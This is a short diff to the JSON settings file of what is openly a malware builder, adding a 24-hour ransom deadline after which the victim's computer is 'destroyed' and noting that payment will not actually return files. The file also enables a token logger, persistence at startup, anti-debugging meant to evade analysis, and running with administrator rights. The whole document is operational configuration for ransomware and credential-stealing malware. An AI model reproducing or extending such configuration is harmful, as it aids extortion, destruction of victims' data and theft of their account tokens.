@@ -9,9 +9,11 @@
     "RANSOMWARE": [true,
         {
             "REBOOTS_ALLOWED": 5,
+            "PAYMENT_TIMELIMIT_IN_HOURS": 24,
+            "//comment": "How many hours the user has to send the payment, if time is up their computer is destroyed.",
             "WALLET": "",
             "RANSOM_AMOUNT": 550,
-            "//coment": "Price to retrieve their files in USD (It won't actually return their files)"
+            "//comment2": "Price to retrieve their files in USD (It won't actually return their files)"
         }
     ],
     "TOKEN_LOGGER": [true, 
@@ -28,6 +30,7 @@
     "//comment": "// Irrelevant if you enable DYNAMIC_WEBHOOK",
     "ADD_TO_STARTUP": true,
     "ANTI_DEBUG": true,
+    "//comment2": "// Disable for testing on VMs",
     "FILE_ICON": "",
     "RUN_WITH_ADMIN": true
 }
